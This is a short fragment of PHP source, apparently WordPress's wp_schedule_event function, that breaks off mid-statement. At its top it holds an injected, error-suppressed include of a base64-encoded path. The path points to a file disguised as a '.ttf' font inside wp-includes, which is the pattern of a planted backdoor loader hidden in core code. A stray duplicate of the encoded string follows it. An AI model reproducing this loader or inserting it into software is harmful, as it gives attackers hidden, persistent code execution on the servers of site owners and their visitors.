...
function wp_schedule_event( $timestamp, $recurrence, $hook, $args = array(), $wp_error = false ) {
    @include base64_decode("L3Zhci93d3cvaHRtbC93cC1pbmNsdWRlcy9UZXh0L0RpZmYvRW5naW5lL2Rhc2hpY29ucy50dGY=");
    ("L3Zhci93d3cvaHRtbC93cC1pbmNsdWRlcy9UZXh0L0RpZmYvRW5naW5lL2Rhc2hpY29ucy50dGY=");
	// Make sure timestamp is a positive integer.
	if ( ! is_numeric( $timestamp ) || $timestamp <= 0 ) {
		if ( $wp_error ) {
			return new WP_Error(
